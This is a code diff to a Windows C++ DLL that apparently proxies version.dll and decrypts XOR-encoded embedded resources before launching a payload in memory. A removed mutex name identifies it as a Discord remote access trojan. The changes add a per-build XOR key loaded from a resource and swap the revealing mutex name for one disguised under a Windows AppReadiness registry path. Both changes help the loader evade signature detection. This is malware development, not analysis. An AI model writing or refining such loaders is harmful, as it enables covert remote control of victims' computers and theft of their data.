@@ -2,17 +2,29 @@
 #include <shlobj.h>
 #include <strsafe.h>
 
+#include "build_config.h"
 #include "clr_host.h"
 
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "advapi32.lib")
 
+#define RES_CONFIG 105
+#define RES_PADDING 106
 #define RES_CORE 102
 #define RES_TOKEN 103
 #define RES_MEDIA 104
-#define XOR_KEY 0xA7
+
+#pragma pack(push, 1)
+struct BuildConfig
+{
+    BYTE xorKey;
+    char buildId[17];
+};
+#pragma pack(pop)
 
 static HMODULE g_realVersion = NULL;
 static HMODULE g_selfModule = NULL;
+static BYTE g_xorKey = PAYLOAD_XOR_KEY;
 
 static FARPROC RealProc(const char* name)
 {
@@ -102,14 +114,6 @@ static bool LoadResourceBuffer(int resourceId, BYTE** outData, DWORD* outSize)
     return true;
 }
 
-static void XorDecodeBuffer(BYTE* data, DWORD size)
-{
-    for (DWORD i = 0; i < size; i++)
-    {
-        data[i] ^= XOR_KEY;
-    }
-}
-
 static void FreeBuffer(BYTE* data)
 {
     if (data)
@@ -118,9 +122,67 @@ static void FreeBuffer(BYTE* data)
     }
 }
 
+static void LoadBuildConfig()
+{
+    BYTE* data = NULL;
+    DWORD size = 0;
+    if (!LoadResourceBuffer(RES_CONFIG, &data, &size) || size < sizeof(BuildConfig))
+    {
+        FreeBuffer(data);
+        return;
+    }
+
+    BuildConfig* cfg = (BuildConfig*)data;
+    if (cfg->xorKey != 0)
+    {
+        g_xorKey = cfg->xorKey;
+    }
+
+    FreeBuffer(data);
+}
+
+static void ResolveInstanceMutexName(wchar_t* outName, size_t outChars)
+{
+    HKEY key = NULL;
+    if (RegOpenKeyExW(
+        HKEY_CURRENT_USER,
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\AppReadiness",
+        0,
+        KEY_READ,
+        &key) == ERROR_SUCCESS)
+    {
+        wchar_t session[32] = { 0 };
+        DWORD sessionChars = sizeof(session);
+        DWORD type = 0;
+        if (RegQueryValueExW(key, L"Session", NULL, &type, (LPBYTE)session, &sessionChars) == ERROR_SUCCESS &&
+            session[0] != L'\0')
+        {
+            StringCchPrintfW(outName, outChars, L"Global\\WRProv_%s", session);
+            RegCloseKey(key);
+            return;
+        }
+        RegCloseKey(key);
+    }
+
+    StringCchPrintfW(outName, outChars, L"Global\\WRProv_%hs", BUILD_ID);
+}
+
+static void XorDecodeBuffer(BYTE* data, DWORD size)
+{
+    for (DWORD i = 0; i < size; i++)
+    {
+        data[i] ^= g_xorKey;
+    }
+}
+
 static void LaunchEmbeddedPayloadInMemory()
 {
-    HANDLE runningMutex = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\DiscordRAT_ShaherDev_v1");
+    LoadBuildConfig();
+
+    wchar_t mutexName[96] = { 0 };
+    ResolveInstanceMutexName(mutexName, 96);
+
+    HANDLE runningMutex = OpenMutexW(SYNCHRONIZE, FALSE, mutexName);
     if (runningMutex)
     {
         CloseHandle(runningMutex);
